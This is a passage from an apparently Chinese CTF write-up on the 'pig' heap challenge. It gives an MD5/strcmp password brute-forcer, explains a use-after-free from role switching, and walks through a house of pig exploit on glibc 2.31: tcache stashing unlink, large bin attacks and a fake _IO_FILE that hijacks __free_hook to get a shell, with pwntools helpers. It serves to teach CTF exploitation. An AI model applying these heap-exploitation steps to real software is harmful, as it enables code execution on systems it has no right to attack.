3个用户在add之后可以立即向新分配的chunk中写入内容，但不是chunk中任何位置都能写。对于peppa，将chunk空间以48字节为大小分组，每一组48字节空间只能写前面16字节，对于mummy则是只能写中间16字节，对于daddy只能写后面16字节。在写入后，会设置两个标志位为0。</p><p><img src="https://img-blog.csdnimg.cn/963c625db0b942a9b7472903a42bd8bc.png"></p><h2 id="B-view-message"><a href="#B-view-message" class="headerlink" title="B. view message"></a>B. view message</h2><p>查看，没有什么好说的，3个用户可以查看的索引范围和可以add的索引范围相同。而且查看时需要有一个标志位为0。这个标志位是add中设置的两个标志位中的第一个。本题限制view的次数最多为2次。</p><h2 id="C-edit-message"><a href="#C-edit-message" class="headerlink" title="C. edit message"></a>C. edit message</h2><p>编辑，3个用户可以查看的索引范围和可以add的索引范围相同。而且查看时需要有一个标志位为0。这个标志位和view message的标志位相同。本题限制edit的次数最多为8次。</p><h2 id="D-delete-message"><a href="#D-delete-message" class="headerlink" title="D. delete message"></a>D. delete message</h2><p>删除，3个用户可以查看的索引范围和可以add的索引范围相同。删除后会将两个标志位置为1。</p><h2 id="E-change-role"><a href="#E-change-role" class="headerlink" title="E. change role"></a>E. change role</h2><p>修改用户。这个部分的主体部分在main函数中实现。分析一下检查函数：<br><img src="https://img-blog.csdnimg.cn/f6a8a35dbff2431098447be93f2606c4.png"></p><p>该函数使用了MD5计算摘要值，如何判断？查看MD5_initialize函数可以发现，这里定义了4个MD5计算的关键魔数，因此不难判断。</p><p><img src="https://img-blog.csdnimg.cn/de4c3a87b6e24f33967aa4fa66b110d7.png"></p><p>在检查函数中，会对输入值与MD5摘要进行判断，判断条件：MD5摘要需要等于某个值，输入值的第一位应该是A或B或C。首字母不同，能够转换到的用户也不同。我们当然不能追求计算出来3个值使得其MD5摘要值相等，但该MD5的比较有bug：</p><p><img src="https://img-blog.csdnimg.cn/3a41f480c12f4b2da458f961d69d1c20.png"></p><p>上图就是保存的MD5值，注意到第三个字节为’\0’，但原程序中比较MD5值使用的是<code>strcmp</code>函数，因此最多只会比较前面3个字节的值。计算出三个摘要的前3字节等于固定值的字符串还是可以实现的，下面是计算的代码，计算结果已经附在后面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">alphabet = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+=&#x27;</span></span><br><span class="line">length = <span class="number">6</span></span><br><span class="line">start_char = <span class="string">&#x27;ABC&#x27;</span></span><br><span class="line">current = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span> ** (length - <span class="number">1</span>)):</span><br><span class="line">        cur_string = start_char[index]</span><br><span class="line">        current_copy = current[index]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(length - <span class="number">1</span>):</span><br><span class="line">            cur_string += alphabet[current_copy % <span class="number">64</span>]</span><br><span class="line">            current_copy //= <span class="number">64</span></span><br><span class="line">        digest = md5(cur_string.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> digest[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;3c4400&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(cur_string, <span class="string">&#x27;: &#x27;</span>, digest)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        current[index] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    threads = [threading.Thread(name=<span class="string">&#x27;t1&#x27;</span>, target=calculate, args=(<span class="number">0</span>,)),</span><br><span class="line">               threading.Thread(name=<span class="string">&#x27;t1&#x27;</span>, target=calculate, args=(<span class="number">1</span>,)),</span><br><span class="line">               threading.Thread(name=<span class="string">&#x27;t1&#x27;</span>, target=calculate, args=(<span class="number">2</span>,))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">AY7Hr0 :  3c4400d1ec4941bfc9e4846a9a4a409e</span></span><br><span class="line"><span class="string">CnY841 :  3c4400f378c82f5ceeb3f309b0ed1e6d</span></span><br><span class="line"><span class="string">BRgTa2 :  3c440036c7cad38b57f4b417df22a0c4</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>根据程序输出，我们获得了三个字符串，在转换用户时只需要输入这3个字符串就能够进行任意的用户转换操作。其中A表示peppa，B表示mummy，C表示daddy。</p><p>在检查函数通过之后，如果我们会更换用户，则会将原来用户分配的chunk复制到一个程序预先分配号的一块空间，然后将新用户的chunk以及标志位等从那一块空间中复制出来。</p><p><img src="https://img-blog.csdnimg.cn/c5eaa0a6279c4606a97cfbae6886abdf.png"></p><p>但是这里需要注意从mmap出来空间中复制过来的只有第二个标志位，第一个标志位并没有被复制过来。</p><h1 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h1><p>本题的漏洞就在于用户的分配上。由于新用户只是复制了第二个标志位，对于某个chunk的索引而言，如果原用户的两个对应标志位均为0，而新用户的两个标志位为1，则用户转换后，两个标志位分别为0和1。注意view message和edit message检查的都是第1个标志位是否为0，对于新用户而言，这个索引原本的chunk是已经被释放的，但这样一来我们就可以再一次访问这个chunk，这就产生了UAF。</p><p>但只有一个UAF，应该如何利用本题的漏洞呢？这就需要介绍一下house of pig这种利用方式的思路了。</p><blockquote><p>该攻击方式适用于 libc 2.31及以后的新版本 libc，本质上是通过 libc2.31 下的 largebin attack以及 FILE 结构利用，来配合 libc2.31 下的 tcache stashing unlink attack 进行组合利用的方法。主要适用于程序中仅有 calloc 函数来申请 chunk，而没有调用 malloc 函数的情况。</p></blockquote><p>本题中，我们可以申请到在tcache保存大小范围的chunk，也可以申请到大于tcache大小的chunk，因此就完美符合这个条件。</p><p>house of pig在本题（libc 2.31版本）利用方式的本质是：想办法将<code>__free_hook</code>保存到tcache中，然后使用一个伪造的<code>_IO_FILE</code>结构体，并想办法将该假结构体链到<code>_IO_list_all</code>（最简单的方法是直接修改<code>_IO_list_all</code>的值到这里），并在glibc检测到内存分配出错时能够转到该<code>_IO_FILE</code>结构体执行<code>_IO_str_overflow</code>，在<code>_IO_str_overflow</code>中连续进行<code>malloc</code>、<code>memcpy</code>、<code>free</code>三个操作，通过<code>memcpy</code>将<code>system</code>函数地址写到<code>__free_hook</code>，通过后面紧跟着的<code>free</code>来getshell。</p><p>下面，我们就开始进行本题的漏洞利用。</p><h1 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3. 漏洞利用"></a>3. 漏洞利用</h1><p>首先写一下交互函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;./pig&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">password = [<span class="string">b&#x27;AY7Hr0&#x27;</span>, <span class="string">b&#x27;BRgTa2&#x27;</span>, <span class="string">b&#x27;CnY841&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br></pre></td></tr></table></figure><h2 id="A-准备tcache-stashing-unlink-attack的堆环境"><a href="#A-准备tcache-stashing-unlink-attack的堆环境" class="headerlink" title="A. 准备tcache stashing unlink attack的堆环境"></a>A. 准备tcache stashing unlink attack的堆环境</h2><p>注意tcache stashing unlink attack需要有两个chunk进入small bins，如果首先进行large bin attack，将会产生一些large bin chunk和unsorted bin chunk，此时如果分配较小的chunk，这两个bins中的chunk都有可能会进行拆分，进而扰乱small bins结构，因此最好能够在一切开始之前首先准备好small bins环境，毕竟small bins中的chunk相对而言是比较稳定的，不会被拆分，只有需要分配对应大小的chunk时才可能发生变化。这种对于不同操作顺序的考虑应该是在进行多次尝试后才能最终确定的，考虑到本题中严格的限制条件，选手很有可能会因为没有使用正确的操作顺序而迟迟无法获得推进。这也提醒我们在遇到困难时可以尝试修改相对独立的操作之间的顺序，以寻找突破口。</p><p>tcache stashing unlink的堆环境<strong>要求有5个chunk位于同一个tcache bins中，同时有2个相同大小的chunk位于small bins</strong>，之后通过修改small bins中链首chunk的bk指针可以将任意地址链入到tcache。</p><ul><li>step 1: 使用mummy分配5个chunk并释放进入tcache。本操作使用了5个mummy的chunk，mummy剩余5个chunk可以使用。</li><li>step 2: 使用peppa用户分配较大的chunk并释放占满tcache。</li><li>step 3: 使用peppa用户分配相同大小的1个chunk并释放进入unsorted bin</li><li>step 4: 使用mummy用户分配较小chunk使peppa用户的chunk被拆分，计算大小使得拆分后的free chunk大小等于tcache中chunk的大小，此时free chunk在拆分后将会进入small bins。</li><li>step 5: 重复步骤2~4，但需要占满另外一个tcache，不能只通过占满一个tcache使两个chunk进入small bins，因此第二次执行步骤2应该填满一个存更大chunk的tcache，然后mummy对应分配的chunk也增加一些。</li></ul><p>在上述步骤完成后，堆中应该有1个chunk进入small bins，1个chunk进入unsorted bin，5个位于tcache，这7个chunk的大小相同，进入small bins的chunk是在第二次进行步骤2时需要分配比其大的chunk时将其从unsorted bin转入small bins中的。上述步骤完成后，peppa将会使用16个chunk，mummy将会使用7个chunk。下图即为该步骤完成后的堆环境，需要进行攻击的是大小为0xA0的chunk。</p><p><img src="https://img-blog.csdnimg.cn/b717be8138e44761b9ed29f33d8ced4d.png"></p><h2 id="B-获取libc地址和堆地址"><a href="#B-获取libc地址和堆地址" class="headerlink" title="B. 获取libc地址和堆地址"></a>B. 获取libc地址和堆地址</h2><p>既然我们需要<code>__free_hook</code>的地址，就应该获得libc的基地址。这个基地址很好获得，只需要分配一个tcache装不下的chunk然后释放掉，通过UAF读取前面的16字节即可。此时这里应该保存的是unsorted bin的地址。</p><p>在步骤A执行时，可以顺便获取到libc的基地址，只需要在unsorted bin中存在chunk时通过UAF进行view操作即可。</p><p>同理，我们也可以通过UAF读取到tcache中chunk保存的堆地址。</p><p>这一步不需要另外分配其他的chunk，为下面的步骤节约出了chunk。两次view的机会也全部用完，后面将不能使用view查看，不过我们已经获得了足够的信息。</p><p>在此之后我们就要正式进行house of pig的利用。</p><h2 id="C-第一次large-bin-attack"><a href="#C-第一次large-bin-attack" class="headerlink" title="C. 第一次large bin attack"></a>C. 第一次large bin attack</h2><p>首先我们需要将<code>_free_hook</code>周围的空间变成一个假chunk，这可以通过large bin attack轻松实现。</p><p><img src="https://img-blog.csdnimg.cn/9502d487b17f498491346914265f9c1d.png"></p><p>高版本libc的large bin attack攻击方式如上图所示（摘自本人以前的博文），我们按照这种方式进行一次攻击。考虑到large bin中的<code>bk_nextsize</code>的偏移为0x20，因此需要使用mummy用户的chunk作为large bin chunk，这样可以修改到<code>bk_nextsize</code>。操作思路如下：</p><ul><li>step 1: 在mummy用户下分配0x450大小（带头部，下同）的chunk</li><li>step 2: 在peppa用户下分配0x440大小的chunk</li><li>step 3: 释放mummy用户的0x450大小的chunk</li><li>step 4: 在mummy用户下分配0x460大小的chunk，这一步可以让mummy的0x450 chunk进入large bin</li><li>step 5: 在peppa用户下释放0x440大小的chunk，这一步就构造好了large bin attack的堆环境</li><li>step 6: 通过UAF修改mummy用户0x450 free chunk中的<code>bk_nextsize</code>为<code>__free_hook</code>附近的地址</li></ul><p>注意这里对分配大小的控制，large bins的前面几个bins是以0x40为大小进行划分，如果分配chunk的大小就为0x450和0x440，这两个chunk可以链入到一个bin中，这是实现large bin attack的前提，如果不能链入同一个bin，就无法对<code>bk_nextsize</code>进行操作。然后考虑到需要让较大chunk进入large bins，必须要能够分配一个更大的chunk，这里mummy分配0x460的chunk就可以将0x450的chunk链入到large bins。下图是第一次large bin attack之后的bins情况。</p><p><img src="https://img-blog.csdnimg.cn/e7d5debc11e74fd49cf7e30fa9ed94e0.png"></p><h2 id="D-第二次large-bin-attack"><a href="#D-第二次large-bin-attack" class="headerlink" title="D. 第二次large bin attack"></a>D. 第二次large bin attack</h2><p>第二次large bin attack，我们的目标是将未来的假<code>_IO_FILE</code>地址写到<code>_IO_list_all</code>中。上一次large bin attack中使用的large bin是可以重用的，我们将<code>bk_nextsize</code>指针改到其他位置还能够再一次进行攻击。第二次large bin attack应该写的具体的堆地址应该根据堆环境进行确定，选择的偏移至关重要。为了方便起见，<strong>我们的伪造<code>_IO_FILE</code>结构体应该在daddy分配索引为4的chunk时附加送给我们的一个chunk中进行构造</strong>。向<code>_IO_list_all</code>中写入的是large bin chunk的地址，如果想要这里同时也指向假<code>_IO_FILE</code>指针，就需要计算好chunk的分配数量，在<code>calloc(0xE8)</code>时能够正好让这个chunk被拆分，这样就实现了此处可写。</p><ul><li>step 1: 在上一步预先多分配0x440的chunk，在这里释放</li><li>step 2: 修改<code>bk_nextsize</code>的值为<code>_IO_list_all-0x20</code></li><li>step 3: 触发large bin attack</li></ul><h2 id="E-tcache-stashing-unlink-attack以及构造-IO-FILE"><a href="#E-tcache-stashing-unlink-attack以及构造-IO-FILE" class="headerlink" title="E. tcache stashing unlink attack以及构造_IO_FILE"></a>E. tcache stashing unlink attack以及构造<code>_IO_FILE</code></h2><p>在第一次large bin attack之后，我们将一个堆地址写到了<code>__free_hook-10</code>的位置，接下来就需要通过tcache stashing unlink attack将这个地址用<code>_IO_str_overflow</code>函数中的<code>malloc</code>函数分配出来。</p><p>在第一步我们已经在tcache和small bins中构造好了攻击环境，下面只需要分配即可。注意这里tcache stashing unlink attack将<code>__free_hook</code>所在地址转移到tcache一定是在daddy分配到最后一个chunk时才能触发，这样可以接上后续写一个0xE8的chunk伪造<code>_IO_FILE</code>结构体。</p><p>这里我们看一下2.31版本libc中<code>_IO_str_overflow</code>的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点注意从21行到36行的内容，首先是计算了<code>_IO_FILE</code>结构体中缓冲区的长度len，计算方式是<code>_IO_buf_end - _IO_buf_base</code>，参见下面的<code>_IO_FILE</code>结构体定义：（注：伪造的实际上是<code>_IO_FILE_complete_plus</code>结构体，其等于<code>_IO_FILE</code>+<code>_IO_FILE_complete</code>附加内容+<code>vtable</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后使用<code>malloc</code>函数申请一块空间，这块空间的大小等于<code>len * 2 + 100</code>，因此我们需要计算好<code>len</code>的值好让<code>malloc</code>能够分配到tcache中<code>__free_hook</code>附近空间。然后调用了<code>memcpy</code>函数将<code>old_buf</code>中的内容复制到<code>new_buf</code>中，在前面所有工作都完成的情况下，这里的<code>new_buf</code>就应该是<code>__free_hook</code>附近的地址，而<code>old_buf</code>这个地址是我们可以控制的，是我们写在假<code>_IO_FILE</code>结构体中的，因此我们可以让<code>_old_buf</code>指向一个写有<code>system</code>函数地址的空间，然后通过<code>memcpy</code>函数将其复制到<code>__free_hook</code>中。</p><p>之后，调用<code>free</code>函数，其参数是<code>old_buf</code>这个地址，我们只需要让这个地址开头写有<code>/bin/sh</code>即可执行<code>system(&quot;/bin/sh&quot;)</code>。这里的内容需要进行精心设计，要控制好偏移的值，同时还需要保证写入到<code>_IO_list_all</code>的堆地址就是假<code>FILE</code>结构体的地址。注意到<code>_IO_list_all</code>的堆地址实际上是large bin中的chunk地址，因此可以通过在最后<code>calloc</code>时切割这个large bin chunk实现对该地址及后面大块空间的完全控制。</p><p>至于我们如何让程序执行<code>_IO_str_overflow</code>这个函数，很简单。这个函数的地址是保存在<code>_IO_str_jumps</code>这个结构体中的，在一般程序正常运行的情况下，<code>_IO_list_all</code>保存有指向标准输入输出的<code>FILE</code>结构体，其中的<code>vtable</code>指向的应该是<code>_IO_file_jumps</code>，而<code>_IO_file_jumps</code>与<code>_IO_str_jumps</code>是一个结构体类型的实例，二者的不同之处是，<code>_IO_file_jumps</code>用于一个<code>FILE</code>结构体在出现异常时调用的函数列表，我们在假<code>FILE</code>结构体中将<code>vtable</code>写成<code>_IO_str_jumps</code>，实际上就是将程序的执行流从<code>_IO_file_overflow</code>改成<code>_IO_str_overflow</code>。这也是house of pig利用的思想精髓所在。</p><p>exp: （其中假<code>FILE</code>结构体中某些字段的设置也有讲究，这个会在下面的演示程序中说明）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 